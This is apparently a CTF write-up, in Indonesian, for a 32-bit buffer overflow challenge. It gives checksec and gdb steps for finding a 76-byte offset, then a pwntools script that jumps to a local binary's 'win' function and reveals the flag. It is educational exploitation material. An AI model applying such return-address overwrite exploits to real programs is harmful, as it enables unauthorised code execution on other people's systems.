# 💥 GreyHat CTF 2025 - Buffer Overflow Challenge

## 🧠 Deskripsi
Kita diberikan file binary 32-bit dengan tantangan buffer overflow klasik.

## 🧪 Analisis Awal

```bash
checksec vuln
```

→ No stack canary, NX disabled.
```bash
gdb ./vuln
pattern create 100
run < pattern
pattern offset 0x41414141  → offset ditemukan: 76
```

## 🛠️ Exploit
```python
from pwn import *

context.binary = './vuln'
elf = context.binary
p = process(elf.path)

offset = 76
win_addr = elf.symbols['win']

payload = b'A' * offset + p32(win_addr)
p.sendline(payload)
p.interactive()
```
Flag: `greyhat{cl4ss1c_b0f_expl01t}`